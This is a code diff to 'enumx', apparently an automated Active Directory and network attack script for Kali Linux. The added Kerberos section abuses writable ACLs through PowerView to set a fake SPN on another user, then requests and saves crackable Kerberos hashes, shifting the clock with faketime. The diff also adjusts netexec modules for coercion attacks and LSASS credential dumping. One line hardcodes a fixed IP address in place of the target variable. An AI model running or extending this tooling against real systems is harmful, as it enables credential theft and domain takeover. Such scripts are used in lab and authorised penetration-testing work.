@@ -12,9 +12,9 @@ cat << "EOF"
  --------------   ----------------------       
 EOF
 # Required tools to be pre-installed:
-#  bloodhound.py cups curl dnsutils git influxdb inetutils-ftp john ldap-utils libimage-exiftool-perl
-#  mariadb-server metasploit-framework nano nbtscan netcat-openbsd netexec nfs-common nmap
-#  odat openssh-client openssl postgresql postgresql-contrib python3-impacket rpcbind
+#  bloodhound.py cups curl dnsutils faketime git influxdb inetutils-ftp john ldap-utils libimage-exiftool-perl
+#  libkrb5-dev mariadb-server metasploit-framework nano nbtscan netcat-openbsd netexec nfs-common nmap
+#  odat openssh-client openssl postgresql postgresql-contrib powerview.py python3-impacket rpcbind
 #  smbclient tree wafw00f whatweb wordlists
 
 # Usage information
@@ -40,7 +40,8 @@ fi
 # Install the pre-required tools for enumx (Kali Linux / Debian)
 if [[ "$1" == "install" ]]; then
     echo 'Installing pre-required tools for enumx (Kali Linux / Debian)...'
-    sudo apt install -y bloodhound.py cups curl dnsutils git influxdb inetutils-ftp john ldap-utils libimage-exiftool-perl mariadb-server metasploit-framework nano nbtscan netcat-openbsd netexec nfs-common nmap odat openssh-client openssl postgresql postgresql-contrib python3-impacket rpcbind smbclient tree wafw00f whatweb wordlists
+    sudo apt install -y bloodhound.py cups curl dnsutils faketime git influxdb inetutils-ftp john ldap-utils libimage-exiftool-perl libkrb5-dev mariadb-server metasploit-framework nano nbtscan netcat-openbsd netexec nfs-common nmap odat openssh-client openssl postgresql postgresql-contrib python3-impacket rpcbind smbclient tree wafw00f whatweb wordlists
+    pip3 install powerview --break-system-packages
     gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
     echo 'Install complete.'
     exit 1
@@ -49,7 +50,7 @@ fi
 target=$1
 
 # Create the enumx working directory
-enumx_dir="/tmp/enumx/$target"
+enumx_dir="/dev/shm/enumx/$target"
 mkdir -p "$enumx_dir"
 
 # Create files for storing found data such as usernames, passwords, hashes, creds and more
@@ -74,18 +75,12 @@ sort -u "$enumx_dir"/domains -o "$enumx_dir"/domains 2>/dev/null
 if [ ! -s "$enumx_dir/modules" ]; then
     echo "enum_av
 enum_ca
-enum_dns
 petitpotam
-zerologon
+shadowcoerce
 spooler
 printnightmare
-dfscoerce
-shadowcoerce
 lsassy
-nanodump
-procdump
-uac
-webdav" >> "$enumx_dir/modules"
+" >> "$enumx_dir/modules"
 fi
 
 # Enter usernames and passwords if creds parameter is selected
@@ -195,6 +190,26 @@ for port in $open_ports; do
         88)
             # https://book.hacktricks.xyz/network-services-pentesting/pentesting-kerberos-88
             nmap $target -p"$port" --host-timeout 3s --min-rate 10000 | grep -vE 'Nmap|latency|nmap' | sed '1d'
+            while IFS= read -r cred; do
+          		read credu credp <<< $(echo "$cred" | sed 's/:/ /')
+          		powerview=$(powerview "$credu":"$credp"@"$target" -q "Get-DomainObjectAcl -SecurityIdentifier "$credu"" | grep -v 'Logging')
+          		echo "$powerview" | grep -iE -B 4 -A 3 'write|fullcontrol'
+          		objsid=$(echo "$powerview" | grep -iE -B 4 -A 3 'write|fullcontrol' | grep -iE 'objectsid' | sed -E 's/.*: //1')
+          		objuser=$(powerview "$credu":"$credp"@"$target" -q "ConvertFrom-SID -ObjectSID $objsid" | grep -v 'Logging' | sed -E 's/.*\\//')
+      			if [ -n "$objsid" ]; then
+	          		powerview "$credu":"$credp"@"$target" -q "Set-DomainObject -Identity $objsid -Set ServicePrincipalName='ANY/ANY'" | grep -v 'Logging'
+	    			clockskew=$(nmap -sC -p139,445 10.129.194.32 --min-rate 10000 | grep -iE 'clock-skew:' | sed -E 's/.*: //' | sed -E 's/(.*h).*/\1/')
+		      		for domain in $(cat "$enumx_dir/domains"); do
+		      			if [ -n "$clockskew" ]; then
+			      			faketime -f "+$clockskew" impacket-GetUserSPNs -request-user "$objuser" -dc-ip "$target" "$domain"/"$credu":"$credp" 2>/dev/null | grep -iE '\$krb' | tee -a "$enumx_dir/hashes" | tee -a "$enumx_dir/.hashes"       			
+				      	else
+				      		for i in {-24..24}; do
+				      			faketime -f "+${i}h" impacket-GetUserSPNs -request-user "$objuser" -dc-ip "$target" "$domain"/"$credu":"$credp" 2>/dev/null | grep -iE '\$krb' | tee -a "$enumx_dir/hashes" | tee -a "$enumx_dir/.hashes"
+				      		done
+			      		fi
+			      	done
+	          	fi
+            done < "$enumx_dir/creds"
             if [ -s "$enumx_dir/domains" ]; then
                 for domain in $(cat "$enumx_dir/domains"); do
                     hash=$(PYTHONWARNINGS="ignore" impacket-GetNPUsers -usersfile "$enumx_dir/usernames" "$domain"/ -dc-ip "$target" | grep -iE '\$krb' 2>/dev/null | tee -a "$enumx_dir/hashes" | tee -a "$enumx_dir/.hashes")
@@ -258,7 +273,7 @@ for port in $open_ports; do
                 if [ -n "$credp" ]; then
                     echo "Using netexec modules as $credu:$credp on $target..."
 	                while IFS= read -r module; do
- 	                    netexec smb "$target" --port "$port" -u "$credu" -p "$credp" -M "$module" 2>/dev/null | grep -viE '[*]'
+ 	                    netexec smb "$target" --port "$port" -u "$credu" -p "$credp" -M "$module" 2>/dev/null | grep -viE '[*]|[+]'
    	            		echo
 	 	            done < "$enumx_dir/modules" 	                
 	            fi
@@ -355,7 +370,7 @@ for port in $open_ports; do
                 if [ -n "$credp" ]; then
                     echo "Using netexec modules as $credu:$credp on $target..."
 	                while IFS= read -r module; do
- 	                    netexec smb "$target" --port "$port" -u "$credu" -p "$credp" -M "$module" 2>/dev/null | grep -viE '[*]'
+ 	                    netexec smb "$target" --port "$port" -u "$credu" -p "$credp" -M "$module" 2>/dev/null | grep -viE '[*]|[+]'
    	            		echo
 	 	            done < "$enumx_dir/modules" 	                
 	            fi
